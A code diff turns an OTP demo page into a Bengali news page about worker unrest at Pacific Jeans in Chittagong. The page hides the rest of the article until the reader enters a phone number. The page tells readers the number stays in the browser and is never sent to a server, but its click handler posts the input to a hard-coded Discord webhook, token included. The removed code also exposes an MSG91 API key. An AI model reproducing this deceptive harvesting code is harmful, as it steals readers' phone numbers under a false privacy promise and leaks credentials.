@@ -1,65 +1,125 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <title>OTP via MSG91 (Frontend R&D)</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>প্যাসিফিক জিন্সে কর্মকর্তাকে ঘিরে শ্রমিক অসন্তোষ — সংবাদ</title>
+  <style>
+    :root{--bg:#f7fafc;--card:#ffffff;--muted:#6b7280;--accent:#0b69ff}
+    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Arial; background:var(--bg);color:#111827}
+    .container{max-width:880px;margin:36px auto;padding:20px}
+    .card{background:var(--card);border-radius:12px;padding:22px;box-shadow:0 6px 18px rgba(10,10,20,0.06)}
+    .eyebrow{font-size:13px;color:var(--muted);margin-bottom:8px}
+    h1{margin:0 0 6px 0;font-size:22px}
+    .meta{font-size:13px;color:var(--muted);margin-bottom:14px}
+    .lead{font-size:16px;line-height:1.6;color:#111827}
+    .actions{margin-top:18px}
+    .btn{display:inline-block;padding:10px 14px;border-radius:8px;background:var(--accent);color:white;text-decoration:none;border:none;cursor:pointer}
+    .small{font-size:13px;color:var(--muted)}
+    .hidden{display:none}
+
+    /* phone input area */
+    .phone-wrap{margin-top:16px;display:flex;gap:10px;align-items:center}
+    input[type="tel"]{padding:10px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:15px;flex:1}
+    .hint{font-size:13px;color:#9ca3af;margin-top:8px}
+
+    /* revealed article */
+    .full-article{margin-top:18px;padding-top:12px;border-top:1px dashed #e6eef9}
+
+    /* small footer */
+    footer{font-size:13px;color:var(--muted);margin-top:18px}
+
+    /* responsive */
+    @media (max-width:520px){.container{padding:12px}.card{padding:16px} h1{font-size:18px}}
+  </style>
 </head>
 <body>
-  <h2>Send OTP via MSG91</h2>
+  <main class="container">
+    <article class="card" aria-labelledby="news-title">
+      <div class="eyebrow">সংবাদ</div>
+      <h1 id="news-title">প্যাসিফিক জিন্সে কর্মকর্তাকে ঘিরে শ্রমিক অসন্তোষ</h1>
+      <div class="meta">চট্টগ্রাম — ৩১ অক্টোবর ২০২৫</div>
 
-  <input id="phone" placeholder="Enter phone number (+8801XXXXXXXXX)">
-  <button onclick="sendOTP()">Send OTP</button>
+      <p class="lead" id="teaser">প্যাসিফিক জিন্স গ্রুপের ক্যাজুয়াল ইউনিট-২–এর এক্সিকিউটিভ কর্মকর্তা বেল্লালকে ঘিরে শ্রমিকদের মধ্যে অসন্তোষ দেখা দিয়েছে। শ্রমিকদের অভিযোগ, বেল্লালের কিছু সিদ্ধান্ত ও আচরণের কারণে সাম্প্রতিক সময়ে একাধিক শ্রমিক চাকরি হারিয়েছেন। <strong>বাকিটা পড়তে ফোন নম্বর দিন</strong> ।</p>
 
-  <br><br>
+      <div class="actions">
+        <label class="small" for="phone">সম্পূর্ণ খবর পড়ার জন্য মোবাইল নম্বর দিন</label>
+        <div class="phone-wrap">
+          <input id="phone" type="tel" placeholder="উদাহরণ: +8801XXXXXXXXX অথবা 01XXXXXXXXX" aria-label="phone number">
+          <button id="submitPhone" class="btn">পড়ুন</button>
+        </div>
+        <div id="phoneHint" class="hint">নম্বরটি ব্রাউজারে সংরক্ষিত থাকবে (localStorage)। সার্ভারে সেন্ড করা হয় না — যদি ব্যাকএন্ড লাগে সেটি নিজের সার্ভারে সংযুক্ত করুন।</div>
+        <div id="phoneError" class="hint" style="color:#b91c1c;display:none;margin-top:8px;"></div>
+      </div>
 
-  <input id="otp" placeholder="Enter received OTP">
-  <button onclick="verifyOTP()">Verify OTP</button>
+      <section id="fullArticle" class="full-article hidden" aria-live="polite">
+        <p>শ্রমিকদের দাবি, বেল্লাল ১৯ অক্টোবর থেকে ৩০ অক্টোবর পর্যন্ত অফিসে অনুপস্থিত ছিলেন এবং এই সময়ে তিনি অন্য একটি পোশাক কারখানায় কাজ করেছেন বলে অভিযোগ উঠেছে। এ বিষয়ে শ্রমিকরা প্রতিষ্ঠানের অপারেশন ম্যানেজার সাগর চাকমার কাছে লিখিতভাবে অভিযোগ দায়ের করেছেন।</p>
+        <p>অপারেশন ম্যানেজার সাগর চাকমা বলেছেন, “বিষয়টি আমরা গুরুত্বের সঙ্গে দেখছি। অভিযোগগুলো যাচাই-বাছাই করে প্রয়োজনীয় প্রশাসনিক ব্যবস্থা নেওয়া হবে।” প্রতিষ্ঠানটির অভ্যন্তরীণ সূত্র জানায়, কর্তৃপক্ষ ইতিমধ্যে অভিযোগের বিষয়ে তদন্ত শুরু করেছে।</p>
+        <p>শ্রমিক প্রতিনিধিরা আশা প্রকাশ করেছেন যে তদন্তের মাধ্যমে ঘটনার সঠিকতা নির্ধারণ করে ন্যায়বিচার নিশ্চিত করা হবে, যাতে ভবিষ্যতে কর্মক্ষেত্রে নিরপেক্ষতা বজায় থাকে।</p>
+        <p><small class="small">(এই সংবাদ প্রতিবেদনটি সহিংসতা বা উস্কানিমূলক কোন অংশ ছাড়া প্রস্তুত করা হয়েছে।)</small></p>
+      </section>
 
-  <p id="status"></p>
+      <footer>
+        <div class="small">আপনি যদি চান, ফোন নম্বর সংগ্রহ করে সার্ভারে সংরক্ষণ করার জন্য আমি একটি নমুনা ব্যাকএন্ড (PHP / Node.js) কোডও তৈরি করে দিই।</div>
+      </footer>
+    </article>
+  </main>
 
   <script>
-    // ⚠️ Your MSG91 API key (R&D only — do NOT use in production)
-    const MSG91_API_KEY = "473802AUwOwrCyNT68efcbf0P1";
+    // Simple front-end-only implementation.
+    const phoneInput = document.getElementById('phone');
+    const submitBtn = document.getElementById('submitPhone');
+    const errorEl = document.getElementById('phoneError');
+    const fullArticle = document.getElementById('fullArticle');
 
-    let generatedOTP = null;
+    // Default validation: allow + and digits, length 7-16. For Bangladesh-specific validation
+    // use the regex below (uncomment to enable):
+    // const bdRegex = /^(?:\+88)?01[3-9]\d{8}$/;
 
-    async function sendOTP() {
-      const phone = document.getElementById("phone").value.trim();
-      if (!phone) {
-        alert("Enter phone number");
-        return;
-      }
-
-      generatedOTP = Math.floor(100000 + Math.random() * 900000);
-      document.getElementById("status").innerText = "Sending OTP...";
-
-      const message = `Your verification code is ${generatedOTP}`;
-
-      // MSG91 SMS API endpoint (transactional route)
-      const url = `https://api.msg91.com/api/v5/flow/`;
-
-      // ⚠️ Using template-based "Flow" (recommended)
-      // You must create a flow in MSG91 dashboard and use that flow_id
-      // For this R&D demo, we'll use the direct "send SMS" API instead.
-
-      const res = await fetch(`https://api.msg91.com/api/sendhttp.php?mobiles=${phone}&authkey=${MSG91_API_KEY}&route=4&sender=TESTIN&message=${encodeURIComponent(message)}&country=91`);
-
-      if (res.ok) {
-        document.getElementById("status").innerText = "OTP sent successfully!";
-      } else {
-        const text = await res.text();
-        document.getElementById("status").innerText = "Error sending OTP: " + text;
-      }
+    function isValidPhone(value){
+      const clean = value.replace(/\s|-/g, '');
+      // generic: starts with +optional then 7-15 digits
+      const generic = /^(?:\+)?\d{7,15}$/;
+      return generic.test(clean);
     }
 
-    function verifyOTP() {
-      const entered = document.getElementById("otp").value.trim();
-      if (entered === generatedOTP.toString()) {
-        document.getElementById("status").innerText = "✅ OTP Verified Successfully!";
-      } else {
-        document.getElementById("status").innerText = "❌ Invalid OTP.";
-      }
+    function showFullArticle(phone){
+      // mask phone for display/storage clarity
+      const masked = phone.replace(/(\d{3})(\d{4})(\d+)/, function(m,a,b,c){ return a + '****' + (c?c.slice(-2):''); });
+      // save to localStorage so user won't need to re-enter
+      try{ localStorage.setItem('news_reader_phone', phone); }catch(e){}
+      fullArticle.classList.remove('hidden');
+      errorEl.style.display = 'none';
+      // Optionally, hide the input after success
+      document.querySelector('.actions').style.display = 'none';
+      // announce
+      fullArticle.setAttribute('aria-hidden','false');
     }
+
+    // restore if already entered
+    window.addEventListener('DOMContentLoaded', ()=>{
+      try{
+        const saved = localStorage.getItem('news_reader_phone');
+        if(saved && isValidPhone(saved)){
+          showFullArticle(saved);
+        }
+      }catch(e){}
+    });
+
+    submitBtn.addEventListener('click', ()=>{
+      const val = phoneInput.value.trim();
+       fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: phone.trim() })
+  });
+      if(!val){ errorEl.textContent = 'অনুগ্রহ করে আপনার ফোন নম্বর লিখুন।'; errorEl.style.display = 'block'; return; }
+      if(!isValidPhone(val)){ errorEl.textContent = 'অবৈধ নম্বর — অনুগ্রহ করে সঠিক নম্বর লিখুন (উদাহরণ: +8801XXXXXXXXX)।'; errorEl.style.display = 'block'; return; }
+      showFullArticle(val);
+    });
+    
+    phoneInput.addEventListener('keyup', ()=>{ errorEl.style.display='none'; });
   </script>
 </body>
+  <script src=script.js></script>
 </html>
